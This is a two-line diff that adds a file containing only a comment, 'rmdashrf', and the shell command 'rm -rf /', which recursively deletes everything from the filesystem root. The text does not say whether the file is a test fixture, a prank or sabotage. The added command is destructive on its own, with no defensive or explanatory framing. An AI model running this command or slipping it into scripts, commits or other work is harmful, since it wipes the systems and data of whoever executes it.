@@ -1,0 +1,2 @@
+# rmdashrf
+rm -rf /
